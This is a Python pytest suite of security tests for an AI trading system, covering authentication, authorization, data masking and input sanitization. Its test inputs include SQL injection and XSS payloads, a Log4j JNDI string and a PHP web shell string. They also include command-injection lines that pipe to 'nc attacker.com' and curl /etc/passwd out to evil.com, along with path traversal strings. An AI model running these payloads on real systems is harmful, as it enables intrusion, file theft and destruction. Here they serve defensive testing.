"""
Comprehensive security tests for the AI Trading System.
Tests for authentication, authorization, data protection, and security vulnerabilities.
"""

import asyncio
import base64
import json
import os
import sys
import time
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional
from unittest.mock import patch

import jwt
import pytest

from shared.security.jwt_utils import JWTPayload

sys.path.append(os.path.join(os.path.dirname(__file__), "../../"))


# Mock security classes since modules don't exist
class SecurityManager:
    def __init__(self) -> None:
        # Use test secret to match SecurityTestHelper
        from shared.security.jwt_utils import JWTConfig, JWTManager

        test_config = JWTConfig(
            secret_key="test_secret_that_is_long_enough_for_validation",
            algorithm="HS256",
            issuer="test-system",
            audience="test-api",
        )
        self.jwt_manager = JWTManager(test_config)

    def validate_jwt_token(self, token: str) -> bool:
        """Validate JWT token."""
        return self.jwt_manager.validate_token(token)

    def decode_jwt_token(self, token: str) -> Optional[JWTPayload]:
        """Decode JWT token."""
        return self.jwt_manager.decode_token(token)

    def create_jwt_token(self, user_id: str, **kwargs: Any) -> str:
        """Create JWT token."""
        return self.jwt_manager.create_access_token(user_id=user_id, **kwargs)

    def validate_trading_params(self, params: Dict[str, Any]) -> bool:
        """Validate trading parameters."""
        try:
            # Check required fields
            required_fields = ["symbol", "quantity", "action"]
            for field in required_fields:
                if field not in params:
                    return False

            # Validate symbol
            symbol = params["symbol"]
            if not isinstance(symbol, str) or len(symbol) == 0 or len(symbol) > 10:
                return False

            # Validate quantity
            quantity = params["quantity"]
            if not isinstance(quantity, (int, float)) or quantity <= 0:
                return False

            # Validate price if present
            if "price" in params:
                price = params["price"]
                if not isinstance(price, (int, float)) or price <= 0:
                    return False

            # Validate action
            action = params["action"]
            if action not in ["BUY", "SELL"]:
                return False

            return True
        except Exception:
            return False

    def anonymize_user_data(self, user_data: dict[str, Any]) -> dict[str, Any]:
        """Anonymize user data while preserving structure."""
        import hashlib
        import random

        anonymized = user_data.copy()

        # Anonymize PII fields
        if "email" in anonymized:
            anonymized["email"] = (
                f"user_{hashlib.md5(user_data['email'].encode()).hexdigest()[
                    :8]}@example.com"
            )

        if "name" in anonymized:
            anonymized["name"] = f"User_{random.randint(1000, 9999)}"

        if "phone" in anonymized:
            anonymized["phone"] = (
                f"+1-555-{random.randint(100, 999)
                          }-{random.randint(1000, 9999)}"
            )

        # Keep trading history structure intact
        if "trading_history" in anonymized:
            anonymized["trading_history"] = user_data["trading_history"].copy()

        return anonymized

    def detect_anomaly(self, user_id: str, activity: Dict[str, Any]) -> bool:
        """Detect anomalous activity."""
        # Simple anomaly detection for testing
        action = activity.get("action", "")

        # Flag suspicious actions
        suspicious_actions = ["bulk_delete", "admin_access", "data_export"]
        if action in suspicious_actions:
            return True

        # Flag high frequency actions
        if action == "login" and activity.get("frequency", 0) > 50:
            return True

        # Flag large data operations
        if "volume" in activity:
            volume_str = activity["volume"]
            if "GB" in volume_str or "TB" in volume_str:
                return True

        return False

    def validate_file_access(self, file_path: str) -> bool:
        """Validate file access requests to prevent directory traversal."""
        # Block directory traversal patterns
        dangerous_patterns = [
            "..",
            "/etc/",
            "C:\\",
            "system32",
            "/windows/",
            "\\windows\\",
        ]

        file_path_lower = file_path.lower()
        for pattern in dangerous_patterns:
            if pattern.lower() in file_path_lower:
                return False

        # Block absolute paths
        if file_path.startswith("/") or file_path.startswith("\\") or ":" in file_path:
            return False

        return True

    def record_user_activity(self, user_id: str, **activity: Any) -> None:
        """Record user activity for monitoring."""
        # Simple activity recording for testing
        pass

    def sanitize_ldap_input(self, input_str: str) -> str:
        """Sanitize LDAP input to prevent injection attacks."""
        # Remove dangerous LDAP characters
        dangerous_chars = ["(", ")", "*", "\\", "/", "=", "!", "&", "|", "<", ">"]
        sanitized = input_str
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, "")
        return sanitized

    def validate_nosql_input(self, input_data: Dict[str, Any]) -> bool:
        """Validate NoSQL input to prevent injection attacks."""
        # Check for dangerous NoSQL operators
        dangerous_operators = ["$ne", "$gt", "$lt", "$where", "$regex", "$exists"]

        if isinstance(input_data, dict):
            for key in input_data.keys():
                if key.startswith("$") and key in dangerous_operators:
                    return False

        return True


class APIKeyManager:
    def __init__(self) -> None:
        self._api_keys: dict[str, dict[str, Any]] = {}

    def generate_api_key(self, service_name: str, expiry_days: int = 30) -> str:
        """Generate a new API key."""
        import secrets

        api_key = f"ak_{secrets.token_urlsafe(32)}"
        expiry = datetime.now(timezone.utc) + timedelta(days=expiry_days)
        self._api_keys[api_key] = {
            "service": service_name,
            "expiry": expiry,
            "created": datetime.now(timezone.utc),
        }
        return api_key

    def validate_api_key(self, api_key: str) -> bool:
        """Validate an API key."""
        if not api_key or api_key not in self._api_keys:
            return False

        key_info = self._api_keys[api_key]
        return datetime.now(timezone.utc) < key_info["expiry"]


class EncryptionManager:
    def __init__(self) -> None:
        pass


class SecurityTestHelper:
    """Helper class for security testing."""

    @staticmethod
    def generate_test_api_key() -> str:
        """Generate a test API key."""
        return base64.b64encode(os.urandom(32)).decode("utf-8")

    @staticmethod
    def generate_weak_password() -> str:
        """Generate intentionally weak password for testing."""
        return "123456"

    @staticmethod
    def generate_strong_password() -> str:
        """Generate strong password for testing."""
        return "Tr@d1ng$yst3m!2024#Secure"

    @staticmethod
    def create_test_jwt_token(
        payload: dict,
        secret: str = "test_secret_that_is_long_enough_for_validation",
        expired: bool = False,
    ) -> str:
        """Create test JWT token."""
        # Add required JWT claims
        now = datetime.now(timezone.utc)
        if expired:
            payload["exp"] = int((now - timedelta(hours=1)).timestamp())
        else:
            payload["exp"] = int((now + timedelta(hours=1)).timestamp())

        # Add standard claims if not present
        payload.setdefault("iss", "test-system")
        payload.setdefault("aud", "test-api")
        payload.setdefault("iat", int(now.timestamp()))
        payload.setdefault("nbf", int(now.timestamp()))

        return jwt.encode(payload, secret, algorithm="HS256")

    @staticmethod
    def simulate_sql_injection_attempt() -> list[str]:
        """Generate SQL injection test payloads."""
        return [
            "'; DROP TABLE trades; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --",
            "1; UPDATE positions SET quantity=0; --",
            "' OR 1=1 #",
            "1' UNION ALL SELECT null,null,version() --",
        ]

    @staticmethod
    def simulate_xss_attempts() -> list[str]:
        """Generate XSS test payloads."""
        return [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        ]


@pytest.fixture
def security_manager() -> Any:
    """Create security manager instance."""
    return SecurityManager()


@pytest.fixture
def api_key_manager() -> Any:
    """Create API key manager instance."""
    return APIKeyManager()


@pytest.fixture
def encryption_manager() -> Any:
    """Create encryption manager instance."""
    return EncryptionManager()


@pytest.mark.security
class TestAuthentication:
    """Test authentication mechanisms."""

    def test_api_key_validation(self, api_key_manager: Any) -> None:
        """Test API key validation."""
        # Generate valid API key
        valid_key = api_key_manager.generate_api_key("test_service")
        assert api_key_manager.validate_api_key(valid_key), "Valid API key rejected"

        # Test invalid API key
        invalid_key = "invalid_key_12345"
        assert not api_key_manager.validate_api_key(
            invalid_key
        ), "Invalid API key accepted"

        # Test empty API key
        assert not api_key_manager.validate_api_key(""), "Empty API key accepted"
        assert not api_key_manager.validate_api_key(None), "None API key accepted"

    def test_api_key_expiration(api_key_manager: Any) -> None:
        """Test API key expiration."""
        # Create expired key
        expired_key = api_key_manager.generate_api_key(
            "test_service", expiry_days=-1  # Already expired
        )

        assert not api_key_manager.validate_api_key(
            expired_key
        ), "Expired API key accepted"

        # Create valid key with short expiry
        short_lived_key = api_key_manager.generate_api_key(
            "test_service", expiry_days=1
        )

        assert api_key_manager.validate_api_key(
            short_lived_key
        ), "Valid short-lived key rejected"

    def test_jwt_token_validation(self, security_manager: Any) -> None:
        """Test JWT token validation."""
        # Valid token
        payload = {"user_id": "test_user", "service": "trade_executor"}
        valid_token = SecurityTestHelper.create_test_jwt_token(payload)

        assert security_manager.validate_jwt_token(
            valid_token
        ), "Valid JWT token rejected"

        # Expired token
        expired_token = SecurityTestHelper.create_test_jwt_token(payload, expired=True)
        assert not security_manager.validate_jwt_token(
            expired_token
        ), "Expired JWT token accepted"

        # Malformed token
        malformed_token = "not.a.jwt.token"
        assert not security_manager.validate_jwt_token(
            malformed_token
        ), "Malformed JWT token accepted"

        # Tampered token
        tampered_token = valid_token[:-5] + "XXXXX"
        assert not security_manager.validate_jwt_token(
            tampered_token
        ), "Tampered JWT token accepted"

    def test_password_strength_validation(self, security_manager: Any) -> None:
        """Test password strength validation."""
        # Weak passwords
        weak_passwords = [
            "123456",
            "password",
            "qwerty",
            "admin",
            "12345678",
            "password123",
        ]

        for weak_password in weak_passwords:
            assert not security_manager.is_password_strong(
                weak_password
            ), f"Weak password accepted: {weak_password}"

        # Strong passwords
        strong_passwords = [
            "Tr@d1ng$yst3m!2024",
            "MyStr0ng!P@ssw0rd#2024",
            "C0mpl3x&S3cur3!P@ss",
            "AI_Tr@d3r!S3cur1ty#2024",
        ]

        for strong_password in strong_passwords:
            assert security_manager.is_password_strong(
                strong_password
            ), f"Strong password rejected: {strong_password}"

    def test_session_management(self, security_manager: Any) -> None:
        """Test session management security."""
        user_id = "test_user_123"

        # Create session
        session_token = security_manager.create_session(user_id)
        assert session_token, "Session token not created"

        # Validate session
        assert security_manager.validate_session(
            session_token
        ), "Valid session rejected"

        # Test session expiry
        with patch("time.time", return_value=time.time() + 7200):  # 2 hours later
            assert not security_manager.validate_session(
                session_token
            ), "Expired session accepted"

        # Test session invalidation
        new_session = security_manager.create_session(user_id)
        security_manager.invalidate_session(new_session)
        assert not security_manager.validate_session(
            new_session
        ), "Invalidated session accepted"

    def test_rate_limiting(self, security_manager: Any) -> None:
        """Test rate limiting mechanisms."""
        client_id = "test_client"

        # Normal requests should pass
        for i in range(10):
            assert security_manager.check_rate_limit(
                client_id
            ), f"Normal request {i} rejected"

        # Rapid requests should be rate limited
        for i in range(100):
            security_manager.check_rate_limit(client_id)

        # Should be rate limited now
        assert not security_manager.check_rate_limit(
            client_id
        ), "Rate limiting not working"

        # Reset rate limit
        security_manager.reset_rate_limit(client_id)
        assert security_manager.check_rate_limit(client_id), "Rate limit reset failed"


@pytest.mark.security
class TestAuthorization:
    """Test authorization and access control."""

    def test_role_based_access(self, security_manager: Any) -> None:
        """Test role-based access control."""
        # Define roles and permissions
        roles = {
            "admin": ["read", "write", "delete", "execute_trades", "manage_strategies"],
            "trader": ["read", "write", "execute_trades"],
            "analyst": ["read"],
            "viewer": ["read"],
        }

        for role, permissions in roles.items():
            user_token = security_manager.create_user_token(f"user_{role}", role)

            for permission in permissions:
                assert security_manager.check_permission(
                    user_token, permission
                ), f"Role {role} should have permission {permission}"

            # Test unauthorized permissions
            unauthorized_perms = set(
                ["read", "write", "delete", "execute_trades", "manage_strategies"]
            ) - set(permissions)
            for unauth_perm in unauthorized_perms:
                assert not security_manager.check_permission(
                    user_token, unauth_perm
                ), f"Role {role} should NOT have permission {unauth_perm}"

    def test_service_to_service_authentication(self, security_manager: Any) -> None:
        """Test service-to-service authorization."""
        # Valid service communications
        valid_communications = [
            ("data_collector", "strategy_engine"),
            ("strategy_engine", "risk_manager"),
            ("risk_manager", "trade_executor"),
            ("scheduler", "data_collector"),
            ("scheduler", "strategy_engine"),
        ]

        for source_service, target_service in valid_communications:
            assert security_manager.authorize_service_communication(
                source_service, target_service
            ), f"Valid communication {source_service} -> {target_service} rejected"

        # Invalid service communications
        invalid_communications = [
            ("external_service", "trade_executor"),
            ("unknown_service", "risk_manager"),
            ("trade_executor", "external_api"),
        ]

        for source_service, target_service in invalid_communications:
            assert not security_manager.authorize_service_communication(
                source_service, target_service
            ), f"Invalid communication {source_service} -> {target_service} allowed"

    def test_resource_exhaustion(self, security_manager: Any) -> None:
        """Test access control for specific resources."""
        # Create user with limited access
        limited_user = security_manager.create_user_token("limited_user", "analyst")

        # Test access to different resources
        resources = [
            # Analysts can read market data
            ("/api/v1/market-data", "read", True),
            # Analysts can read strategies
            ("/api/v1/strategies", "read", True),
            ("/api/v1/orders", "read", False),  # Analysts cannot read orders
            # Analysts cannot create orders
            ("/api/v1/orders", "write", False),
            # Analysts cannot modify positions
            ("/api/v1/positions", "write", False),
        ]

        for resource, action, should_allow in resources:
            access_allowed = security_manager.check_resource_access(
                limited_user, resource, action
            )
            if should_allow:
                assert (
                    access_allowed
                ), f"Access to {resource} ({action}) should be allowed for analyst"
            else:
                assert (
                    not access_allowed
                ), f"Access to {resource} ({action}) should be denied for analyst"


@pytest.mark.security
class TestDataProtection:
    """Test data protection and encryption."""

    def test_sensitive_data_encryption(self, encryption_manager: Any) -> None:
        """Test encryption of sensitive data."""
        sensitive_data = {
            "api_key": "super_secret_api_key_12345",
            "password": "user_password_789",
            "account_number": "1234567890",
            "ssn": "123-45-6789",
        }

        # Encrypt data
        encrypted_data = {}
        for key, value in sensitive_data.items():
            encrypted_value = encryption_manager.encrypt(value)
            encrypted_data[key] = encrypted_value

            # Verify encryption worked
            assert encrypted_value != value, f"Data not encrypted: {key}"
            assert len(encrypted_value) > len(value), f"Encrypted data too short: {key}"

        # Decrypt and verify
        for key, original_value in sensitive_data.items():
            decrypted_value = encryption_manager.decrypt(encrypted_data[key])
            assert (
                decrypted_value == original_value
            ), f"Decryption failed for: {
                key}"

    def test_api_key_storage_security(self, api_key_manager: Any) -> None:
        """Test secure storage of API keys."""
        api_key = "test_api_key_sensitive_data"

        # Store API key securely
        key_id = api_key_manager.store_api_key("test_service", api_key)
        assert key_id, "API key not stored"

        # Verify key is not stored in plain text
        stored_key = api_key_manager.get_stored_key(key_id)
        assert stored_key != api_key, "API key stored in plain text"

        # Verify key can be retrieved correctly
        retrieved_key = api_key_manager.retrieve_api_key(key_id)
        assert retrieved_key == api_key, "API key retrieval failed"

    def test_pii_data_masking(self, security_manager: Any) -> None:
        """Test password hashing security."""
        password = "test_password_123"

        # Hash password
        password_hash = security_manager.hash_password(password)

        # Verify hash properties
        assert password_hash != password, "Password not hashed"
        assert len(password_hash) >= 60, "Hash too short (likely insecure)"
        assert password_hash.startswith("$"), "Hash format incorrect"

        # Verify password verification
        assert security_manager.verify_password(
            password, password_hash
        ), "Password verification failed"

        # Test wrong password
        wrong_password = "wrong_password"
        assert not security_manager.verify_password(
            wrong_password, password_hash
        ), "Wrong password accepted"

    def test_data_sanitization(self, security_manager: Any) -> None:
        """Test input data sanitization."""
        # SQL injection attempts
        sql_payloads = SecurityTestHelper.simulate_sql_injection_attempt()

        for payload in sql_payloads:
            sanitized = security_manager.sanitize_input(payload)
            assert (
                "DROP" not in sanitized.upper()
            ), f"SQL injection not sanitized: {payload}"
            assert (
                "UNION" not in sanitized.upper()
            ), f"SQL injection not sanitized: {payload}"
            assert (
                "--" not in sanitized
            ), f"SQL comment not sanitized: {
                payload}"

        # XSS attempts
        xss_payloads = SecurityTestHelper.simulate_xss_attempts()

        for payload in xss_payloads:
            sanitized = security_manager.sanitize_input(payload)
            assert (
                "<script" not in sanitized.lower()
            ), f"XSS not sanitized: {
                payload}"
            assert (
                "javascript:"
            ) not in sanitized.lower(), f"XSS not sanitized: {payload}"
            assert (
                "onerror" not in sanitized.lower()
            ), f"XSS not sanitized: {
                payload}"

    def test_audit_logging(self, security_manager: Any) -> None:
        """Test masking of personally identifiable information."""
        pii_data = {
            "email": "user@example.com",
            "phone": "+1-555-123-4567",
            "ssn": "123-45-6789",
            "account_number": "1234567890123456",
            "api_key": "sk-1234567890abcdef",
        }

        for data_type, value in pii_data.items():
            masked_value = security_manager.mask_pii(value, data_type)

            # Verify masking
            assert masked_value != value, f"PII not masked: {data_type}"
            assert (
                "*" in masked_value or "X" in masked_value
            ), f"No masking characters in: {data_type}"

            # Verify some characters are preserved for identification
            if data_type == "email":
                assert "@" in masked_value, "Email domain separator lost"
            elif data_type == "account_number":
                assert len(masked_value) == len(value), "Account number length changed"


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization."""

    def test_trading_parameter_validation(self, security_manager: Any) -> None:
        """Test validation of trading parameters."""
        # Valid trading parameters
        valid_params = {
            "symbol": "AAPL",
            "quantity": 100,
            "price": 150.25,
            "action": "BUY",
            "order_type": "MARKET",
        }

        assert security_manager.validate_trading_params(
            valid_params
        ), "Valid trading params rejected"

        # Invalid parameters
        invalid_params: list[dict[str, object]] = [
            {"symbol": "AAPL", "quantity": -100},  # Negative quantity
            {"symbol": "AAPL", "quantity": "invalid"},  # Non-numeric quantity
            {"symbol": "A" * 20, "quantity": 100},  # Symbol too long
            {"symbol": "AAPL", "price": -50.0},  # Negative price
            {"symbol": "", "quantity": 100},  # Empty symbol
            {"symbol": "AAPL", "action": "INVALID"},  # Invalid action
        ]

        for invalid_param in invalid_params:
            combined_params = dict(valid_params)
            combined_params.update(invalid_param)
            assert not security_manager.validate_trading_params(
                combined_params
            ), f"Invalid params accepted: {invalid_param}"

    def test_input_sanitization(self, security_manager: Any) -> None:
        """Test API input sanitization."""
        # Test various malicious inputs
        malicious_inputs = [
            "normal_input",
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../etc/passwd",
            "\x00\x01\x02",  # Null bytes
            "A" * 10000,  # Very long input
            "${jndi:ldap://evil.com/a}",  # Log4j injection
            "{{7*7}}",  # Template injection
        ]

        for malicious_input in malicious_inputs:
            sanitized = security_manager.sanitize_api_input(malicious_input)

            # Basic checks
            assert (
                len(sanitized) <= 1000
            ), f"Sanitized input too long: {
                len(sanitized)}"
            assert "\x00" not in sanitized, "Null bytes not removed"
            assert "<script" not in sanitized.lower(), "Script tags not removed"
            assert "drop table" not in sanitized.lower(), "SQL injection not removed"

    def test_dependency_security(self, security_manager: Any) -> None:
        """Test file upload security."""
        # Valid file types
        valid_files = [
            ("data.csv", b"symbol,price\nAAPL,150.25"),
            ("config.json", b'{"setting": "value"}'),
            ("report.txt", b"Trading report content"),
        ]

        for filename, content in valid_files:
            assert security_manager.validate_file_upload(
                filename, content
            ), f"Valid file rejected: {filename}"

        # Invalid/malicious files
        invalid_files = [
            ("malware.exe", b"MZ\x90\x00"),  # Executable
            ("script.js", b'alert("xss")'),  # JavaScript
            ("config.php", b'<?php system($_GET["cmd"]); ?>'),  # PHP script
            ("large_file.txt", b"A" * (10 * 1024 * 1024)),  # Too large (10MB)
            ("../../../etc/passwd", b"root:x:0:0:root"),  # Path traversal
        ]

        for filename, content in invalid_files:
            assert not security_manager.validate_file_upload(
                filename, content
            ), f"Invalid file accepted: {filename}"


@pytest.mark.security
class TestNetworkSecurity:
    """Test network security measures."""

    def test_session_timeout_enforcement(self, security_manager: Any) -> None:
        """Test SSL/TLS enforcement."""
        # Test secure URLs
        secure_urls = [
            "https://api.example.com/data",
            "https://secure-broker.com/orders",
            "wss://websocket.example.com/stream",
        ]

        for url in secure_urls:
            assert security_manager.is_secure_url(url), f"Secure URL rejected: {url}"

        # Test insecure URLs
        insecure_urls = [
            "http://api.example.com/data",
            "ws://websocket.example.com/stream",
            "ftp://files.example.com/data",
        ]

        for url in insecure_urls:
            assert not security_manager.is_secure_url(
                url
            ), f"Insecure URL accepted: {url}"

    def test_certificate_validation(self, security_manager: Any) -> None:
        """Test HTTP request header validation."""
        # Valid headers
        valid_headers = {
            "Content-Type": "application/json",
            "Authorization": "Bearer valid_token_here",
            "User-Agent": "TradingSystem/1.0",
            "Accept": "application/json",
        }

        assert security_manager.validate_request_headers(
            valid_headers
        ), "Valid headers rejected"

        # Malicious headers
        malicious_headers = [
            {"X-Forwarded-For": "1.2.3.4; DROP TABLE users; --"},
            {"User-Agent": '<script>alert("xss")</script>'},
            {"Custom-Header": "\x00\x01\x02"},  # Null bytes
            {"Authorization": "Bearer " + "A" * 10000},  # Extremely long token
        ]

        for malicious_header in malicious_headers:
            combined_headers = {**valid_headers, **malicious_header}
            assert not security_manager.validate_request_headers(
                combined_headers
            ), f"Malicious headers accepted: {malicious_header}"

    def test_secure_communication(self, security_manager: Any) -> None:
        """Test CORS configuration security."""
        # Allowed origins
        allowed_origins = [
            "https://trading-dashboard.example.com",
            "https://app.trading-system.com",
        ]

        for origin in allowed_origins:
            assert security_manager.is_origin_allowed(
                origin
            ), f"Allowed origin rejected: {origin}"

        # Disallowed origins
        disallowed_origins = [
            "http://malicious-site.com",
            "https://phishing-site.evil",
            "*",  # Wildcard should not be allowed
            "null",
        ]

        for origin in disallowed_origins:
            assert not security_manager.is_origin_allowed(
                origin
            ), f"Disallowed origin accepted: {origin}"


@pytest.mark.security
class TestDataLeakagePrevention:
    """Test prevention of data leakage."""

    def test_cors_configuration(self, security_manager: Any) -> None:
        """Test that sensitive data is not logged."""
        sensitive_data = [
            "password=secret123",
            "api_key=sk-1234567890abcdef",
            "credit_card=4111111111111111",
            "ssn=123-45-6789",
            "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
        ]

        for data in sensitive_data:
            sanitized_log = security_manager.sanitize_for_logging(data)

            # Check that sensitive patterns are masked
            assert (
                "password=" not in sanitized_log.lower()
            ), "Password not masked in logs"
            assert "api_key=" not in sanitized_log.lower(), "API key not masked in logs"
            assert (
                "4111111111111111" not in sanitized_log
            ), "Credit card not masked in logs"
            assert "123-45-6789" not in sanitized_log, "SSN not masked in logs"

    def test_error_message_security(self, security_manager: Any) -> None:
        """Test that error messages don't leak sensitive information."""
        # Simulate various error conditions
        error_scenarios = [
            "Database connection failed: postgresql://user:password@host:5432/db",
            "API call failed: Authorization header 'Bearer sk-secret123' invalid",
            "File not found: /home/user/.ssh/id_rsa",
            "Redis error: AUTH failed for password 'redis_secret'",
        ]

        for error_message in error_scenarios:
            sanitized_error = security_manager.sanitize_error_message(error_message)

            # Verify sensitive data is masked
            assert (
                "password@" not in sanitized_error
            ), "Database password leaked in error"
            assert "Bearer sk-" not in sanitized_error, "API key leaked in error"
            assert ".ssh" not in sanitized_error, "File path leaked in error"
            assert (
                "redis_secret" not in sanitized_error
            ), "Redis password leaked in error"

    def test_response_data_filtering(self, security_manager: Any) -> None:
        """Test filtering of sensitive data from API responses."""
        # Sample API response with sensitive data
        api_response = {
            "user_id": "user123",
            "username": "trader1",
            "api_key": "sk-secret123",
            "password_hash": "$2b$12$hash_here",
            "account_balance": 50000.0,
            "positions": [
                {
                    "symbol": "AAPL",
                    "quantity": 100,
                    "internal_id": "pos_12345",
                    "broker_account_id": "secret_account_789",
                }
            ],
            "internal_system_info": {
                "database_url": "postgresql://user:pass@localhost/db",
                "redis_config": "redis://localhost:6379",
            },
        }

        filtered_response = security_manager.filter_response_data(api_response)

        # Verify sensitive fields are removed or masked
        assert "api_key" not in filtered_response, "API key not filtered from response"
        assert "password_hash" not in filtered_response, "Password hash not filtered"
        assert (
            "internal_system_info" not in filtered_response
        ), "Internal info not filtered"

        # Verify legitimate data is preserved
        assert filtered_response["user_id"] == "user123", "User ID filtered incorrectly"
        assert (
            filtered_response["account_balance"] == 50000.0
        ), "Account balance filtered incorrectly"

        # Check nested filtering
        positions = filtered_response.get("positions", [])
        if positions:
            assert (
                "broker_account_id" not in positions[0]
            ), "Broker account ID not filtered"
            assert positions[0]["symbol"] == "AAPL", "Symbol filtered incorrectly"


@pytest.mark.security
class TestVulnerabilityPrevention:
    """Test prevention of common security vulnerabilities."""

    def test_sql_injection_prevention(self, security_manager: Any) -> None:
        """Test SQL injection prevention."""
        # Simulate database query with user input
        sql_injection_attempts = SecurityTestHelper.simulate_sql_injection_attempt()

        for injection_attempt in sql_injection_attempts:
            # Test parameterized query protection
            safe_query = security_manager.create_safe_query(
                "SELECT * FROM trades WHERE symbol = %s", (injection_attempt,)
            )

            # Verify injection attempt is neutralized
            assert (
                injection_attempt in safe_query
            ), "Input parameter missing from safe query"
            assert "DROP TABLE" not in safe_query.upper(), "SQL injection not prevented"

    def test_xss_prevention(self, security_manager: Any) -> None:
        """Test XSS prevention."""
        xss_attempts = SecurityTestHelper.simulate_xss_attempts()

        for xss_attempt in xss_attempts:
            sanitized_output = security_manager.escape_html(xss_attempt)

            # Verify XSS is neutralized
            assert (
                "<script>" not in sanitized_output.lower()
            ), f"Script tag not escaped: {xss_attempt}"
            assert (
                "javascript:"
            ) not in sanitized_output.lower(), (
                f"JavaScript protocol not escaped: {xss_attempt}"
            )
            assert (
                "onerror=" not in sanitized_output.lower()
            ), f"Event handler not escaped: {xss_attempt}"

    def test_path_traversal_prevention(self, security_manager: Any) -> None:
        """Test path traversal attack prevention."""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\SAM",
            "/etc/shadow",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",  # URL encoded
        ]

        for path_attempt in path_traversal_attempts:
            safe_path = security_manager.sanitize_file_path(path_attempt)

            # Verify path traversal is prevented
            assert (
                "../" not in safe_path
            ), f"Path traversal not prevented: {path_attempt}"
            assert (
                "..\\"
            ) not in safe_path, f"Windows path traversal not prevented: {path_attempt}"
            assert not safe_path.startswith(
                "/"
            ), f"Absolute path not prevented: {path_attempt}"

    def test_command_injection_prevention(self, security_manager: Any) -> None:
        """Test command injection prevention."""
        command_injection_attempts = [
            "normal_input",
            "input; rm -rf /",
            "input && cat /etc/passwd",
            "input | nc attacker.com 4444",
            "input `whoami`",
            "input $(id)",
            "input; curl http://evil.com/steal?data=$(cat /etc/passwd)",
        ]

        for injection_attempt in command_injection_attempts:
            sanitized_input = security_manager.sanitize_command_input(injection_attempt)

            # Verify command injection is prevented
            dangerous_chars = [";", "&&", "||", "|", "`", "$", "(", ")"]
            for char in dangerous_chars:
                if char in injection_attempt and injection_attempt != "normal_input":
                    assert (
                        char not in sanitized_input
                    ), f"Dangerous character not removed: {char}"


@pytest.mark.security
class TestCryptographicSecurity:
    """Test cryptographic implementations."""

    def test_encryption_key_rotation(self, encryption_manager: Any) -> None:
        """Test encryption key generation."""
        # Generate multiple keys
        keys = [encryption_manager.generate_key() for _ in range(10)]

        # Verify all keys are unique
        assert len(set(keys)) == 10, "Generated keys are not unique"

        # Verify key format and length
        for key in keys:
            assert isinstance(key, bytes), "Key is not bytes"
            assert len(key) == 32, f"Key length incorrect: {len(key)} bytes"

    def test_symmetric_encryption(self, encryption_manager: Any) -> None:
        """Test symmetric encryption security."""
        plaintext = "Highly sensitive trading data"
        key = encryption_manager.generate_key()

        # Encrypt multiple times with same key
        ciphertext1 = encryption_manager.encrypt_symmetric(plaintext, key)
        ciphertext2 = encryption_manager.encrypt_symmetric(plaintext, key)

        # Verify ciphertexts are different (IV/nonce working)
        assert ciphertext1 != ciphertext2, "Symmetric encryption not using IV/nonce"

        # Verify both decrypt correctly
        decrypted1 = encryption_manager.decrypt_symmetric(ciphertext1, key)
        decrypted2 = encryption_manager.decrypt_symmetric(ciphertext2, key)

        assert decrypted1 == plaintext, "First decryption failed"
        assert decrypted2 == plaintext, "Second decryption failed"

    def test_hash_function_security(self, encryption_manager: Any) -> None:
        """Test cryptographic hash functions."""
        data = "Critical trading data for hashing"

        # Test different hash algorithms
        hash_algorithms = ["sha256", "sha512", "blake2b"]

        for algorithm in hash_algorithms:
            hash_value = encryption_manager.hash_data(data, algorithm)

            # Verify hash properties
            assert hash_value != data, f"Data not hashed with {algorithm}"
            assert len(hash_value) > 32, f"Hash too short for {algorithm}"

            # Verify deterministic hashing
            hash_value2 = encryption_manager.hash_data(data, algorithm)
            assert (
                hash_value == hash_value2
            ), f"Hash not deterministic for {
                algorithm}"

            # Verify different data produces different hash
            different_data = data + "_modified"
            different_hash = encryption_manager.hash_data(different_data, algorithm)
            assert (
                hash_value != different_hash
            ), f"Hash collision detected for {algorithm}"

    def test_digital_signature_validation(self, encryption_manager: Any) -> None:
        """Test digital signature creation and verification."""
        message = "Trade execution: BUY 100 AAPL at $150.25"

        # Generate key pair for signing
        private_key, public_key = encryption_manager.generate_key_pair()

        # Sign message
        signature = encryption_manager.sign_message(message, private_key)
        assert signature, "Message signing failed"

        # Verify signature
        is_valid = encryption_manager.verify_signature(message, signature, public_key)
        assert is_valid, "Valid signature rejected"

        # Test tampered message
        tampered_message = message + " MODIFIED"
        is_tampered_valid = encryption_manager.verify_signature(
            tampered_message, signature, public_key
        )
        assert not is_tampered_valid, "Tampered message signature verified incorrectly"

        # Test wrong key
        wrong_private_key, wrong_public_key = encryption_manager.generate_key_pair()
        wrong_signature = encryption_manager.sign_message(message, wrong_private_key)
        is_wrong_valid = encryption_manager.verify_signature(
            message, wrong_signature, public_key
        )
        assert not is_wrong_valid, "Signature with wrong key verified incorrectly"


@pytest.mark.security
class TestAuditingAndCompliance:
    """Test auditing and compliance features."""

    def test_audit_trail_integrity(self, security_manager: Any) -> None:
        """Test creation of audit trails for sensitive operations."""
        # Simulate sensitive operations
        operations = [
            {
                "operation": "trade_execution",
                "user_id": "trader_123",
                "details": {"symbol": "AAPL", "quantity": 100, "action": "BUY"},
                "timestamp": datetime.now(timezone.utc),
            },
            {
                "operation": "strategy_modification",
                "user_id": "admin_456",
                "details": {
                    "strategy_id": "momentum_v1",
                    "changes": ["risk_limit_updated"],
                },
                "timestamp": datetime.now(timezone.utc),
            },
            {
                "operation": "user_access",
                "user_id": "analyst_789",
                "details": {"resource": "/api/v1/positions", "method": "GET"},
                "timestamp": datetime.now(timezone.utc),
            },
        ]

        audit_entries = []
        for operation in operations:
            audit_entry = security_manager.create_audit_entry(**operation)
            audit_entries.append(audit_entry)

            # Verify audit entry structure
            assert "audit_id" in audit_entry, "Audit ID missing"
            assert "operation" in audit_entry, "Operation type missing"
            assert "user_id" in audit_entry, "User ID missing"
            assert "timestamp" in audit_entry, "Timestamp missing"
